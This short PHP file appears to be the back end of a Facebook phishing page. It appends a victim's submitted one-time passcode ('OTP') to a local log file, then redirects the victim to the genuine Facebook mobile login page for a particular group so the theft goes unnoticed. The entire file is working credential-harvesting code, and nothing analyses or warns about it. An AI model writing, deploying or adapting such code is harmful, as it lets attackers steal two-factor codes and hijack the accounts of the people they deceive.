<?php

file_put_contents("log.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F466569070430079&email=&li=JeDOXUZPau6mBI-eMwepznvd&e=1348092&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F466569070430079&_rdr');
exit();
